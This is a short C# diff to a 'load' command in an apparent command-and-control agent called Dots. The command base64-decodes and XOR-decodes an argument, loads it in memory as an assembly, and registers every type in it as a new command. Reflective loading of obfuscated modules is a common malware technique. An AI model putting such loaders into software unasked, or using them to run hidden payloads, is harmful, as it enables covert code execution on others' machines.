@@ -11,11 +11,17 @@ namespace Dots.Commands
     public class LoadCommand : DotsCommand
     {
         public override string Name => "load";
+        public override DotsProperties DotsProperty { get; set; }
 
-        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
+        public override string Execute(string[] args)
         {
-            Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]));
-            SetupResult(task, $"Succesfully loaded {assembly.FullName} module.");
+            Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(args[0]), args[1]));
+            foreach (var type in assembly.GetTypes())
+            {
+                Object command = Activator.CreateInstance(type);
+                DotsProperty.Commands.Add(command);
+            }
+            return $"Succesfully loaded {assembly.FullName} module.";
         }
     }
 }
